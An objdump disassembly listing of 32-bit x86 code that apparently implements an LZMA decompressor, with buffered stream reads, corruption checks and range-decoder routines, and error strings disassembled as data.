  407bae:	51                   	push   %ecx
  407baf:	8b d8                	mov    %eax,%ebx
  407bb1:	83 7b 0c 05          	cmpl   $0x5,0xc(%ebx)
  407bb5:	7d 16                	jge    0x407bcd
  407bb7:	b9 3c 7c 40 00       	mov    $0x407c3c,%ecx
  407bbc:	b2 01                	mov    $0x1,%dl
  407bbe:	b8 80 77 40 00       	mov    $0x407780,%eax
  407bc3:	e8 b8 dc ff ff       	call   0x405880
  407bc8:	e8 e7 b2 ff ff       	call   0x402eb4
  407bcd:	8b d4                	mov    %esp,%edx
  407bcf:	b9 04 00 00 00       	mov    $0x4,%ecx
  407bd4:	8b 43 08             	mov    0x8(%ebx),%eax
  407bd7:	e8 c4 f8 ff ff       	call   0x4074a0
  407bdc:	83 6b 0c 04          	subl   $0x4,0xc(%ebx)
  407be0:	8b 73 0c             	mov    0xc(%ebx),%esi
  407be3:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  407be9:	7e 05                	jle    0x407bf0
  407beb:	be 00 10 00 00       	mov    $0x1000,%esi
  407bf0:	8d 53 1c             	lea    0x1c(%ebx),%edx
  407bf3:	8b ce                	mov    %esi,%ecx
  407bf5:	8b 43 08             	mov    0x8(%ebx),%eax
  407bf8:	e8 a3 f8 ff ff       	call   0x4074a0
  407bfd:	29 73 0c             	sub    %esi,0xc(%ebx)
  407c00:	33 c0                	xor    %eax,%eax
  407c02:	89 43 14             	mov    %eax,0x14(%ebx)
  407c05:	89 73 18             	mov    %esi,0x18(%ebx)
  407c08:	8d 43 1c             	lea    0x1c(%ebx),%eax
  407c0b:	8b d6                	mov    %esi,%edx
  407c0d:	e8 06 fd ff ff       	call   0x407918
  407c12:	3b 04 24             	cmp    (%esp),%eax
  407c15:	74 16                	je     0x407c2d
  407c17:	b9 3c 7c 40 00       	mov    $0x407c3c,%ecx
  407c1c:	b2 01                	mov    $0x1,%dl
  407c1e:	b8 80 77 40 00       	mov    $0x407780,%eax
  407c23:	e8 58 dc ff ff       	call   0x405880
  407c28:	e8 87 b2 ff ff       	call   0x402eb4
  407c2d:	5a                   	pop    %edx
  407c2e:	5e                   	pop    %esi
  407c2f:	5b                   	pop    %ebx
  407c30:	c3                   	ret
  407c31:	00 00                	add    %al,(%eax)
  407c33:	00 ff                	add    %bh,%bh
  407c35:	ff                   	(bad)
  407c36:	ff                   	(bad)
  407c37:	ff 1d 00 00 00 43    	lcall  *0x43000000
  407c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  407c3e:	6d                   	insl   (%dx),%es:(%edi)
  407c3f:	70 72                	jo     0x407cb3
  407c41:	65 73 73             	gs jae 0x407cb7
  407c44:	65 64 20 62 6c       	gs and %ah,%fs:0x6c(%edx)
  407c49:	6f                   	outsl  %ds:(%esi),(%dx)
  407c4a:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  407c4d:	69 73 20 63 6f 72 72 	imul   $0x72726f63,0x20(%ebx),%esi
  407c54:	75 70                	jne    0x407cc6
  407c56:	74 65                	je     0x407cbd
  407c58:	64 00 00             	add    %al,%fs:(%eax)
  407c5b:	00 53 56             	add    %dl,0x56(%ebx)
  407c5e:	57                   	push   %edi
  407c5f:	55                   	push   %ebp
  407c60:	51                   	push   %ecx
  407c61:	8b f9                	mov    %ecx,%edi
  407c63:	8b f0                	mov    %eax,%esi
  407c65:	33 c0                	xor    %eax,%eax
  407c67:	89 04 24             	mov    %eax,(%esp)
  407c6a:	8b ea                	mov    %edx,%ebp
  407c6c:	85 ff                	test   %edi,%edi
  407c6e:	7e 3f                	jle    0x407caf
  407c70:	83 7e 18 00          	cmpl   $0x0,0x18(%esi)
  407c74:	75 0d                	jne    0x407c83
  407c76:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  407c7a:	74 33                	je     0x407caf
  407c7c:	8b c6                	mov    %esi,%eax
  407c7e:	e8 29 ff ff ff       	call   0x407bac
  407c83:	8b df                	mov    %edi,%ebx
  407c85:	8b 46 18             	mov    0x18(%esi),%eax
  407c88:	3b d8                	cmp    %eax,%ebx
  407c8a:	76 02                	jbe    0x407c8e
  407c8c:	8b d8                	mov    %eax,%ebx
  407c8e:	8b d5                	mov    %ebp,%edx
  407c90:	8b 46 14             	mov    0x14(%esi),%eax
  407c93:	8d 44 06 1c          	lea    0x1c(%esi,%eax,1),%eax
  407c97:	8b cb                	mov    %ebx,%ecx
  407c99:	e8 e6 a9 ff ff       	call   0x402684
  407c9e:	01 5e 14             	add    %ebx,0x14(%esi)
  407ca1:	29 5e 18             	sub    %ebx,0x18(%esi)
  407ca4:	03 eb                	add    %ebx,%ebp
  407ca6:	2b fb                	sub    %ebx,%edi
  407ca8:	01 1c 24             	add    %ebx,(%esp)
  407cab:	85 ff                	test   %edi,%edi
  407cad:	7f c1                	jg     0x407c70
  407caf:	8b 04 24             	mov    (%esp),%eax
  407cb2:	5a                   	pop    %edx
  407cb3:	5d                   	pop    %ebp
  407cb4:	5f                   	pop    %edi
  407cb5:	5e                   	pop    %esi
  407cb6:	5b                   	pop    %ebx
  407cb7:	c3                   	ret
  407cb8:	53                   	push   %ebx
  407cb9:	56                   	push   %esi
  407cba:	57                   	push   %edi
  407cbb:	8b f1                	mov    %ecx,%esi
  407cbd:	8b fa                	mov    %edx,%edi
  407cbf:	8b d8                	mov    %eax,%ebx
  407cc1:	8b 43 04             	mov    0x4(%ebx),%eax
  407cc4:	85 c0                	test   %eax,%eax
  407cc6:	74 0b                	je     0x407cd3
  407cc8:	8b d7                	mov    %edi,%edx
  407cca:	8b ce                	mov    %esi,%ecx
  407ccc:	8b 18                	mov    (%eax),%ebx
  407cce:	ff 53 04             	call   *0x4(%ebx)
  407cd1:	eb 25                	jmp    0x407cf8
  407cd3:	8b d7                	mov    %edi,%edx
  407cd5:	8b ce                	mov    %esi,%ecx
  407cd7:	8b c3                	mov    %ebx,%eax
  407cd9:	e8 7e ff ff ff       	call   0x407c5c
  407cde:	3b f0                	cmp    %eax,%esi
  407ce0:	74 16                	je     0x407cf8
  407ce2:	b9 04 7d 40 00       	mov    $0x407d04,%ecx
  407ce7:	b2 01                	mov    $0x1,%dl
  407ce9:	b8 80 77 40 00       	mov    $0x407780,%eax
  407cee:	e8 8d db ff ff       	call   0x405880
  407cf3:	e8 bc b1 ff ff       	call   0x402eb4
  407cf8:	5f                   	pop    %edi
  407cf9:	5e                   	pop    %esi
  407cfa:	5b                   	pop    %ebx
  407cfb:	c3                   	ret
  407cfc:	ff                   	(bad)
  407cfd:	ff                   	(bad)
  407cfe:	ff                   	(bad)
  407cff:	ff 1d 00 00 00 43    	lcall  *0x43000000
  407d05:	6f                   	outsl  %ds:(%esi),(%dx)
  407d06:	6d                   	insl   (%dx),%es:(%edi)
  407d07:	70 72                	jo     0x407d7b
  407d09:	65 73 73             	gs jae 0x407d7f
  407d0c:	65 64 20 62 6c       	gs and %ah,%fs:0x6c(%edx)
  407d11:	6f                   	outsl  %ds:(%esi),(%dx)
  407d12:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  407d15:	69 73 20 63 6f 72 72 	imul   $0x72726f63,0x20(%ebx),%esi
  407d1c:	75 70                	jne    0x407d8e
  407d1e:	74 65                	je     0x407d85
  407d20:	64 00 00             	add    %al,%fs:(%eax)
	...
  407d3b:	00 64 7d 40          	add    %ah,0x40(%ebp,%edi,2)
  407d3f:	00 68 00             	add    %ch,0x0(%eax)
  407d42:	01 00                	add    %eax,(%eax)
  407d44:	14 78                	adc    $0x78,%al
  407d46:	40                   	inc    %eax
  407d47:	00 c4                	add    %al,%ah
  407d49:	29 40 00             	sub    %eax,0x0(%eax)
  407d4c:	ac                   	lods   %ds:(%esi),%al
  407d4d:	28 40 00             	sub    %al,0x0(%eax)
  407d50:	d4 28                	aam    $0x28
  407d52:	40                   	inc    %eax
  407d53:	00 90 7e 40 00 e8    	add    %dl,-0x17ffbf82(%eax)
  407d59:	79 40                	jns    0x407d9b
  407d5b:	00 d4                	add    %dl,%ah
  407d5d:	7f 40                	jg     0x407d9f
  407d5f:	00 78 80             	add    %bh,-0x80(%eax)
  407d62:	40                   	inc    %eax
  407d63:	00 17                	add    %dl,(%edi)
  407d65:	54                   	push   %esp
  407d66:	4c                   	dec    %esp
  407d67:	5a                   	pop    %edx
  407d68:	4d                   	dec    %ebp
  407d69:	41                   	inc    %ecx
  407d6a:	31 53 6d             	xor    %edx,0x6d(%ebx)
  407d6d:	61                   	popa
  407d6e:	6c                   	insb   (%dx),%es:(%edi)
  407d6f:	6c                   	insb   (%dx),%es:(%edi)
  407d70:	44                   	inc    %esp
  407d71:	65 63 6f 6d          	arpl   %ebp,%gs:0x6d(%edi)
  407d75:	70 72                	jo     0x407de9
  407d77:	65 73 73             	gs jae 0x407ded
  407d7a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d7b:	72 53                	jb     0x407dd0
  407d7d:	83 c4 f8             	add    $0xfffffff8,%esp
  407d80:	8b d8                	mov    %eax,%ebx
  407d82:	89 1c 24             	mov    %ebx,(%esp)
  407d85:	c6 44 24 04 00       	movb   $0x0,0x4(%esp)
  407d8a:	54                   	push   %esp
  407d8b:	6a 00                	push   $0x0
  407d8d:	b9 b0 7d 40 00       	mov    $0x407db0,%ecx
  407d92:	b2 01                	mov    $0x1,%dl
  407d94:	b8 80 77 40 00       	mov    $0x407780,%eax
  407d99:	e8 16 db ff ff       	call   0x4058b4
  407d9e:	e8 11 b1 ff ff       	call   0x402eb4
  407da3:	59                   	pop    %ecx
  407da4:	5a                   	pop    %edx
  407da5:	5b                   	pop    %ebx
  407da6:	c3                   	ret
  407da7:	00 ff                	add    %bh,%bh
  407da9:	ff                   	(bad)
  407daa:	ff                   	(bad)
  407dab:	ff 32                	push   (%edx)
  407dad:	00 00                	add    %al,(%eax)
  407daf:	00 6c 7a 6d          	add    %ch,0x6d(%edx,%edi,2)
  407db3:	61                   	popa
  407db4:	64 65 63 6f 6d       	fs arpl %ebp,%gs:0x6d(%edi)
  407db9:	70 73                	jo     0x407e2e
  407dbb:	6d                   	insl   (%dx),%es:(%edi)
  407dbc:	61                   	popa
  407dbd:	6c                   	insb   (%dx),%es:(%edi)
  407dbe:	6c                   	insb   (%dx),%es:(%edi)
  407dbf:	3a 20                	cmp    (%eax),%ah
  407dc1:	43                   	inc    %ebx
  407dc2:	6f                   	outsl  %ds:(%esi),(%dx)
  407dc3:	6d                   	insl   (%dx),%es:(%edi)
  407dc4:	70 72                	jo     0x407e38
  407dc6:	65 73 73             	gs jae 0x407e3c
  407dc9:	65 64 20 64 61 74    	gs and %ah,%fs:0x74(%ecx,%eiz,2)
  407dcf:	61                   	popa
  407dd0:	20 69 73             	and    %ch,0x73(%ecx)
  407dd3:	20 63 6f             	and    %ah,0x6f(%ebx)
  407dd6:	72 72                	jb     0x407e4a
  407dd8:	75 70                	jne    0x407e4a
  407dda:	74 65                	je     0x407e41
  407ddc:	64 20 28             	and    %ch,%fs:(%eax)
  407ddf:	25 64 29 00 00       	and    $0x2964,%eax
  407de4:	53                   	push   %ebx
  407de5:	83 c4 f8             	add    $0xfffffff8,%esp
  407de8:	8b d8                	mov    %eax,%ebx
  407dea:	89 1c 24             	mov    %ebx,(%esp)
  407ded:	c6 44 24 04 0b       	movb   $0xb,0x4(%esp)
  407df2:	54                   	push   %esp
  407df3:	6a 00                	push   $0x0
  407df5:	b9 18 7e 40 00       	mov    $0x407e18,%ecx
  407dfa:	b2 01                	mov    $0x1,%dl
  407dfc:	b8 c8 77 40 00       	mov    $0x4077c8,%eax
  407e01:	e8 ae da ff ff       	call   0x4058b4
  407e06:	e8 a9 b0 ff ff       	call   0x402eb4
  407e0b:	59                   	pop    %ecx
  407e0c:	5a                   	pop    %edx
  407e0d:	5b                   	pop    %ebx
  407e0e:	c3                   	ret
  407e0f:	00 ff                	add    %bh,%bh
  407e11:	ff                   	(bad)
  407e12:	ff                   	(bad)
  407e13:	ff 13                	call   *(%ebx)
  407e15:	00 00                	add    %al,(%eax)
  407e17:	00 6c 7a 6d          	add    %ch,0x6d(%edx,%edi,2)
  407e1b:	61                   	popa
  407e1c:	64 65 63 6f 6d       	fs arpl %ebp,%gs:0x6d(%edi)
  407e21:	70 73                	jo     0x407e96
  407e23:	6d                   	insl   (%dx),%es:(%edi)
  407e24:	61                   	popa
  407e25:	6c                   	insb   (%dx),%es:(%edi)
  407e26:	6c                   	insb   (%dx),%es:(%edi)
  407e27:	3a 20                	cmp    (%eax),%ah
  407e29:	25 73 00 55 8b       	and    $0x8b550073,%eax
  407e2e:	ec                   	in     (%dx),%al
  407e2f:	6a 00                	push   $0x0
  407e31:	53                   	push   %ebx
  407e32:	56                   	push   %esi
  407e33:	57                   	push   %edi
  407e34:	8b f9                	mov    %ecx,%edi
  407e36:	8b f2                	mov    %edx,%esi
  407e38:	8b d8                	mov    %eax,%ebx
  407e3a:	33 c0                	xor    %eax,%eax
  407e3c:	55                   	push   %ebp
  407e3d:	68 75 7e 40 00       	push   $0x407e75
  407e42:	64 ff 30             	push   %fs:(%eax)
  407e45:	64 89 20             	mov    %esp,%fs:(%eax)
  407e48:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407e4b:	50                   	push   %eax
  407e4c:	8b d6                	mov    %esi,%edx
  407e4e:	8b cf                	mov    %edi,%ecx
  407e50:	8b c3                	mov    %ebx,%eax
  407e52:	e8 2d d3 ff ff       	call   0x405184
  407e57:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407e5a:	e8 85 ff ff ff       	call   0x407de4
  407e5f:	33 c0                	xor    %eax,%eax
  407e61:	5a                   	pop    %edx
  407e62:	59                   	pop    %ecx
  407e63:	59                   	pop    %ecx
  407e64:	64 89 10             	mov    %edx,%fs:(%eax)
  407e67:	68 7c 7e 40 00       	push   $0x407e7c
  407e6c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407e6f:	e8 24 b3 ff ff       	call   0x403198
  407e74:	c3                   	ret
  407e75:	e9 82 af ff ff       	jmp    0x402dfc
  407e7a:	eb f0                	jmp    0x407e6c
  407e7c:	5f                   	pop    %edi
  407e7d:	5e                   	pop    %esi
  407e7e:	5b                   	pop    %ebx
  407e7f:	59                   	pop    %ecx
  407e80:	5d                   	pop    %ebp
  407e81:	c3                   	ret
  407e82:	8b c0                	mov    %eax,%eax
  407e84:	8b 40 04             	mov    0x4(%eax),%eax
  407e87:	e8 50 00 00 00       	call   0x407edc
  407e8c:	33 c0                	xor    %eax,%eax
  407e8e:	c3                   	ret
  407e8f:	90                   	nop
  407e90:	53                   	push   %ebx
  407e91:	56                   	push   %esi
  407e92:	8b da                	mov    %edx,%ebx
  407e94:	8b f0                	mov    %eax,%esi
  407e96:	8b c6                	mov    %esi,%eax
  407e98:	e8 1b 00 00 00       	call   0x407eb8
  407e9d:	33 d2                	xor    %edx,%edx
  407e9f:	8b c6                	mov    %esi,%eax
  407ea1:	e8 72 aa ff ff       	call   0x402918
  407ea6:	84 db                	test   %bl,%bl
  407ea8:	74 07                	je     0x407eb1
  407eaa:	8b c6                	mov    %esi,%eax
  407eac:	e8 53 ac ff ff       	call   0x402b04
  407eb1:	8b c6                	mov    %esi,%eax
  407eb3:	5e                   	pop    %esi
  407eb4:	5b                   	pop    %ebx
  407eb5:	c3                   	ret
  407eb6:	8b c0                	mov    %eax,%eax
  407eb8:	53                   	push   %ebx
  407eb9:	8b d8                	mov    %eax,%ebx
  407ebb:	33 c0                	xor    %eax,%eax
  407ebd:	89 43 64             	mov    %eax,0x64(%ebx)
  407ec0:	8b 43 60             	mov    0x60(%ebx),%eax
  407ec3:	85 c0                	test   %eax,%eax
  407ec5:	74 12                	je     0x407ed9
  407ec7:	68 00 80 00 00       	push   $0x8000
  407ecc:	6a 00                	push   $0x0
  407ece:	50                   	push   %eax
  407ecf:	e8 28 c6 ff ff       	call   0x4044fc
  407ed4:	33 c0                	xor    %eax,%eax
  407ed6:	89 43 60             	mov    %eax,0x60(%ebx)
  407ed9:	5b                   	pop    %ebx
  407eda:	c3                   	ret
  407edb:	90                   	nop
  407edc:	53                   	push   %ebx
  407edd:	56                   	push   %esi
  407ede:	8b f1                	mov    %ecx,%esi
  407ee0:	8b d8                	mov    %eax,%ebx
  407ee2:	8d 43 68             	lea    0x68(%ebx),%eax
  407ee5:	89 02                	mov    %eax,(%edx)
  407ee7:	33 c0                	xor    %eax,%eax
  407ee9:	89 06                	mov    %eax,(%esi)
  407eeb:	80 7b 0c 00          	cmpb   $0x0,0xc(%ebx)
  407eef:	75 19                	jne    0x407f0a
  407ef1:	8d 53 68             	lea    0x68(%ebx),%edx
  407ef4:	b9 00 00 01 00       	mov    $0x10000,%ecx
  407ef9:	8b 43 08             	mov    0x8(%ebx),%eax
  407efc:	ff 53 04             	call   *0x4(%ebx)
  407eff:	89 06                	mov    %eax,(%esi)
  407f01:	83 3e 00             	cmpl   $0x0,(%esi)
  407f04:	75 04                	jne    0x407f0a
  407f06:	c6 43 0c 01          	movb   $0x1,0xc(%ebx)
  407f0a:	5e                   	pop    %esi
  407f0b:	5b                   	pop    %ebx
  407f0c:	c3                   	ret
  407f0d:	8d 40 00             	lea    0x0(%eax),%eax
  407f10:	53                   	push   %ebx
  407f11:	56                   	push   %esi
  407f12:	57                   	push   %edi
  407f13:	83 c4 f0             	add    $0xfffffff0,%esp
  407f16:	8b d8                	mov    %eax,%ebx
  407f18:	8b d4                	mov    %esp,%edx
  407f1a:	b9 05 00 00 00       	mov    $0x5,%ecx
  407f1f:	8b 43 08             	mov    0x8(%ebx),%eax
  407f22:	ff 53 04             	call   *0x4(%ebx)
  407f25:	83 f8 05             	cmp    $0x5,%eax
  407f28:	74 0a                	je     0x407f34
  407f2a:	b8 01 00 00 00       	mov    $0x1,%eax
  407f2f:	e8 48 fe ff ff       	call   0x407d7c
  407f34:	8d 43 10             	lea    0x10(%ebx),%eax
  407f37:	33 c9                	xor    %ecx,%ecx
  407f39:	ba 50 00 00 00       	mov    $0x50,%edx
  407f3e:	e8 39 a8 ff ff       	call   0x40277c
  407f43:	6a 05                	push   $0x5
  407f45:	8d 44 24 0c          	lea    0xc(%esp),%eax
  407f49:	50                   	push   %eax
  407f4a:	8d 44 24 14          	lea    0x14(%esp),%eax
  407f4e:	50                   	push   %eax
  407f4f:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  407f53:	8d 43 10             	lea    0x10(%ebx),%eax
  407f56:	ba 50 00 00 00       	mov    $0x50,%edx
  407f5b:	e8 48 0b 00 00       	call   0x408aa8
  407f60:	85 c0                	test   %eax,%eax
  407f62:	74 0a                	je     0x407f6e
  407f64:	b8 03 00 00 00       	mov    $0x3,%eax
  407f69:	e8 0e fe ff ff       	call   0x407d7c
  407f6e:	81 7c 24 0c 00 00 00 	cmpl   $0x4000000,0xc(%esp)
  407f75:	04 
  407f76:	76 0a                	jbe    0x407f82
  407f78:	b8 07 00 00 00       	mov    $0x7,%eax
  407f7d:	e8 fa fd ff ff       	call   0x407d7c
  407f82:	8b 74 24 08          	mov    0x8(%esp),%esi
  407f86:	03 74 24 0c          	add    0xc(%esp),%esi
  407f8a:	3b 73 64             	cmp    0x64(%ebx),%esi
  407f8d:	74 27                	je     0x407fb6
  407f8f:	8b c3                	mov    %ebx,%eax
  407f91:	e8 22 ff ff ff       	call   0x407eb8
  407f96:	6a 04                	push   $0x4
  407f98:	68 00 10 00 00       	push   $0x1000
  407f9d:	56                   	push   %esi
  407f9e:	6a 00                	push   $0x0
  407fa0:	e8 4f c5 ff ff       	call   0x4044f4
  407fa5:	8b f8                	mov    %eax,%edi
  407fa7:	89 7b 60             	mov    %edi,0x60(%ebx)
  407faa:	85 ff                	test   %edi,%edi
  407fac:	75 05                	jne    0x407fb3
  407fae:	e8 c1 d8 ff ff       	call   0x405874
  407fb3:	89 73 64             	mov    %esi,0x64(%ebx)
  407fb6:	8b 4b 60             	mov    0x60(%ebx),%ecx
  407fb9:	03 4c 24 08          	add    0x8(%esp),%ecx
  407fbd:	8d 43 10             	lea    0x10(%ebx),%eax
  407fc0:	8b 53 60             	mov    0x60(%ebx),%edx
  407fc3:	e8 30 0b 00 00       	call   0x408af8
  407fc8:	c6 43 0d 01          	movb   $0x1,0xd(%ebx)
  407fcc:	83 c4 10             	add    $0x10,%esp
  407fcf:	5f                   	pop    %edi
  407fd0:	5e                   	pop    %esi
  407fd1:	5b                   	pop    %ebx
  407fd2:	c3                   	ret
  407fd3:	90                   	nop
  407fd4:	53                   	push   %ebx
  407fd5:	56                   	push   %esi
  407fd6:	57                   	push   %edi
  407fd7:	83 c4 ec             	add    $0xffffffec,%esp
  407fda:	8b f1                	mov    %ecx,%esi
  407fdc:	8b fa                	mov    %edx,%edi
  407fde:	8b d8                	mov    %eax,%ebx
  407fe0:	80 7b 0d 00          	cmpb   $0x0,0xd(%ebx)
  407fe4:	75 07                	jne    0x407fed
  407fe6:	8b c3                	mov    %ebx,%eax
  407fe8:	e8 23 ff ff ff       	call   0x407f10
  407fed:	c7 04 24 84 7e 40 00 	movl   $0x407e84,(%esp)
  407ff4:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  407ff8:	56                   	push   %esi
  407ff9:	8d 44 24 0c          	lea    0xc(%esp),%eax
  407ffd:	50                   	push   %eax
  407ffe:	8b cf                	mov    %edi,%ecx
  408000:	8d 54 24 08          	lea    0x8(%esp),%edx
  408004:	8d 43 10             	lea    0x10(%ebx),%eax
  408007:	e8 00 04 00 00       	call   0x40840c
  40800c:	8b d0                	mov    %eax,%edx
  40800e:	83 ea 01             	sub    $0x1,%edx
  408011:	72 29                	jb     0x40803c
  408013:	74 02                	je     0x408017
  408015:	eb 0c                	jmp    0x408023
  408017:	b8 05 00 00 00       	mov    $0x5,%eax
  40801c:	e8 5b fd ff ff       	call   0x407d7c
  408021:	eb 19                	jmp    0x40803c
  408023:	89 44 24 0c          	mov    %eax,0xc(%esp)
  408027:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  40802c:	8d 54 24 0c          	lea    0xc(%esp),%edx
  408030:	33 c9                	xor    %ecx,%ecx
  408032:	b8 60 80 40 00       	mov    $0x408060,%eax
  408037:	e8 f0 fd ff ff       	call   0x407e2c
  40803c:	8b 44 24 08          	mov    0x8(%esp),%eax
  408040:	3b c6                	cmp    %esi,%eax
  408042:	74 0a                	je     0x40804e
  408044:	b8 06 00 00 00       	mov    $0x6,%eax
  408049:	e8 2e fd ff ff       	call   0x407d7c
  40804e:	83 c4 14             	add    $0x14,%esp
  408051:	5f                   	pop    %edi
  408052:	5e                   	pop    %esi
  408053:	5b                   	pop    %ebx
  408054:	c3                   	ret
  408055:	00 00                	add    %al,(%eax)
  408057:	00 ff                	add    %bh,%bh
  408059:	ff                   	(bad)
  40805a:	ff                   	(bad)
  40805b:	ff 16                	call   *(%esi)
  40805d:	00 00                	add    %al,(%eax)
  40805f:	00 4c 7a 6d          	add    %cl,0x6d(%edx,%edi,2)
  408063:	61                   	popa
  408064:	44                   	inc    %esp
  408065:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408069:	65 20 66 61          	and    %ah,%gs:0x61(%esi)
  40806d:	69 6c 65 64 20 28 25 	imul   $0x64252820,0x64(%ebp,%eiz,2),%ebp
  408074:	64 
  408075:	29 00                	sub    %eax,(%eax)
  408077:	00 c6                	add    %al,%dh
  408079:	40                   	inc    %eax
  40807a:	0d 00 c6 40 0c       	or     $0xc40c600,%eax
  40807f:	00 c3                	add    %al,%bl
  408081:	8d 40 00             	lea    0x0(%eax),%eax
  408084:	53                   	push   %ebx
  408085:	8b d8                	mov    %eax,%ebx
  408087:	56                   	push   %esi
  408088:	51                   	push   %ecx
  408089:	8b 03                	mov    (%ebx),%eax
  40808b:	3b 43 04             	cmp    0x4(%ebx),%eax
  40808e:	75 27                	jne    0x4080b7
  408090:	8b cc                	mov    %esp,%ecx
  408092:	8b 73 10             	mov    0x10(%ebx),%esi
  408095:	8b d3                	mov    %ebx,%edx
  408097:	8b c6                	mov    %esi,%eax
  408099:	ff 16                	call   *(%esi)
  40809b:	89 43 14             	mov    %eax,0x14(%ebx)
  40809e:	8b 0b                	mov    (%ebx),%ecx
  4080a0:	03 0c 24             	add    (%esp),%ecx
  4080a3:	89 4b 04             	mov    %ecx,0x4(%ebx)
  4080a6:	83 3c 24 00          	cmpl   $0x0,(%esp)
  4080aa:	75 0b                	jne    0x4080b7
  4080ac:	c7 43 18 01 00 00 00 	movl   $0x1,0x18(%ebx)
  4080b3:	b0 ff                	mov    $0xff,%al
  4080b5:	eb 06                	jmp    0x4080bd
  4080b7:	8b 13                	mov    (%ebx),%edx
  4080b9:	ff 03                	incl   (%ebx)
  4080bb:	8a 02                	mov    (%edx),%al
  4080bd:	5a                   	pop    %edx
  4080be:	5e                   	pop    %esi
  4080bf:	5b                   	pop    %ebx
  4080c0:	c3                   	ret
  4080c1:	90                   	nop
  4080c2:	90                   	nop
  4080c3:	90                   	nop
  4080c4:	53                   	push   %ebx
  4080c5:	8b d8                	mov    %eax,%ebx
  4080c7:	33 c0                	xor    %eax,%eax
  4080c9:	56                   	push   %esi
  4080ca:	89 43 04             	mov    %eax,0x4(%ebx)
  4080cd:	33 d2                	xor    %edx,%edx
  4080cf:	89 03                	mov    %eax,(%ebx)
  4080d1:	33 c9                	xor    %ecx,%ecx
  4080d3:	89 53 18             	mov    %edx,0x18(%ebx)
  4080d6:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  4080d9:	c7 43 08 ff ff ff ff 	movl   $0xffffffff,0x8(%ebx)
  4080e0:	33 f6                	xor    %esi,%esi
  4080e2:	8b c3                	mov    %ebx,%eax
  4080e4:	e8 9b ff ff ff       	call   0x408084
  4080e9:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  4080ec:	33 d2                	xor    %edx,%edx
  4080ee:	c1 e1 08             	shl    $0x8,%ecx
  4080f1:	8a d0                	mov    %al,%dl
  4080f3:	0b d1                	or     %ecx,%edx
  4080f5:	46                   	inc    %esi
  4080f6:	83 fe 05             	cmp    $0x5,%esi
  4080f9:	89 53 0c             	mov    %edx,0xc(%ebx)
  4080fc:	7c e4                	jl     0x4080e2
  4080fe:	5e                   	pop    %esi
  4080ff:	5b                   	pop    %ebx
  408100:	c3                   	ret
  408101:	90                   	nop
  408102:	90                   	nop
  408103:	90                   	nop
  408104:	53                   	push   %ebx
  408105:	56                   	push   %esi
  408106:	57                   	push   %edi
  408107:	55                   	push   %ebp
  408108:	51                   	push   %ecx
  408109:	89 04 24             	mov    %eax,(%esp)
  40810c:	8b 04 24             	mov    (%esp),%eax
  40810f:	33 ed                	xor    %ebp,%ebp
  408111:	8b fa                	mov    %edx,%edi
  408113:	85 ff                	test   %edi,%edi
  408115:	8b 58 08             	mov    0x8(%eax),%ebx
  408118:	8b 04 24             	mov    (%esp),%eax
  40811b:	8b 70 0c             	mov    0xc(%eax),%esi
  40811e:	74 30                	je     0x408150
  408120:	d1 eb                	shr    $1,%ebx
  408122:	03 ed                	add    %ebp,%ebp
  408124:	3b de                	cmp    %esi,%ebx
  408126:	77 05                	ja     0x40812d
  408128:	2b f3                	sub    %ebx,%esi
  40812a:	83 cd 01             	or     $0x1,%ebp
  40812d:	81 fb 00 00 00 01    	cmp    $0x1000000,%ebx
  408133:	73 16                	jae    0x40814b
  408135:	c1 e3 08             	shl    $0x8,%ebx
  408138:	8b 04 24             	mov    (%esp),%eax
  40813b:	e8 44 ff ff ff       	call   0x408084
  408140:	33 d2                	xor    %edx,%edx
  408142:	c1 e6 08             	shl    $0x8,%esi
  408145:	8a d0                	mov    %al,%dl
  408147:	0b d6                	or     %esi,%edx
  408149:	8b f2                	mov    %edx,%esi
  40814b:	4f                   	dec    %edi
  40814c:	85 ff                	test   %edi,%edi
  40814e:	75 d0                	jne    0x408120
  408150:	8b 0c 24             	mov    (%esp),%ecx
  408153:	89 59 08             	mov    %ebx,0x8(%ecx)
  408156:	8b 04 24             	mov    (%esp),%eax
  408159:	89 70 0c             	mov    %esi,0xc(%eax)
  40815c:	8b c5                	mov    %ebp,%eax
  40815e:	5a                   	pop    %edx
  40815f:	5d                   	pop    %ebp
  408160:	5f                   	pop    %edi
  408161:	5e                   	pop    %esi
  408162:	5b                   	pop    %ebx
  408163:	c3                   	ret
  408164:	53                   	push   %ebx
  408165:	8b da                	mov    %edx,%ebx
  408167:	0f b7 08             	movzwl (%eax),%ecx
  40816a:	8b 53 08             	mov    0x8(%ebx),%edx
  40816d:	c1 ea 0b             	shr    $0xb,%edx
  408170:	0f af d1             	imul   %ecx,%edx
  408173:	3b 53 0c             	cmp    0xc(%ebx),%edx
  408176:	76 3b                	jbe    0x4081b3
  408178:	89 53 08             	mov    %edx,0x8(%ebx)
  40817b:	b9 00 08 00 00       	mov    $0x800,%ecx
  408180:	0f b7 10             	movzwl (%eax),%edx
  408183:	2b ca                	sub    %edx,%ecx
  408185:	c1 f9 05             	sar    $0x5,%ecx
  408188:	66 01 08             	add    %cx,(%eax)
  40818b:	81 7b 08 00 00 00 01 	cmpl   $0x1000000,0x8(%ebx)
  408192:	73 1b                	jae    0x4081af
  408194:	8b c3                	mov    %ebx,%eax
  408196:	e8 e9 fe ff ff       	call   0x408084
  40819b:	25 ff 00 00 00       	and    $0xff,%eax
  4081a0:	8b 53 0c             	mov    0xc(%ebx),%edx
  4081a3:	c1 e2 08             	shl    $0x8,%edx
  4081a6:	0b c2                	or     %edx,%eax
  4081a8:	89 43 0c             	mov    %eax,0xc(%ebx)
  4081ab:	c1 63 08 08          	shll   $0x8,0x8(%ebx)
  4081af:	33 c0                	xor    %eax,%eax
  4081b1:	5b                   	pop    %ebx
  4081b2:	c3                   	ret
  4081b3:	29 53 08             	sub    %edx,0x8(%ebx)
